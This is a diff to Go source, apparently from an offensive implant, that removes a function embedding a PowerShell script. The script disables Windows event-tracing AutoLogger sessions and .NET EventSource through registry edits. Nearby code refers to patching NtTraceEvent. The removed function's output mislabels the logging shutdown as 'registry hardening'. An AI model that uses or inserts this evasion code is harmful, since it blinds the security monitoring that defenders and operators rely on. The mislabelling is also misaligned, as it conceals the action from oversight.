@@ -46,32 +46,3 @@ func etwNtTraceEvent() string {
 
 	return "NtTraceEvent bypass: patched → returns STATUS_SUCCESS"
 }
-
-func etwRegBypass() string {
-	// Disable ETW via registry
-	ps := `
-$paths = @(
-	"HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener",
-	"HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger",
-	"HKLM:\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\FileTrace"
-)
-$results = @()
-foreach ($p in $paths) {
-	try {
-		Set-ItemProperty -Path $p -Name "Start" -Value 0 -Type DWord -Force -ErrorAction Stop
-		$results += "Disabled: $p"
-	} catch {
-		$results += "Skip: $p ($_)"
-	}
-}
-# Disable .NET EventSource
-try {
-	$net4 = "HKLM:\SOFTWARE\Microsoft\.NETFramework"
-	Set-ItemProperty -Path $net4 -Name "EventSourceEnabled" -Value 0 -Type DWord -Force -ErrorAction Stop
-	$results += "Disabled .NET EventSource"
-} catch { }
-Write-Output ($results -join [char]10)
-`
-	_ = ps
-	return etwBypass() + "\nRun 'etw_reg_bypass' via PowerShell for additional registry hardening"
-}
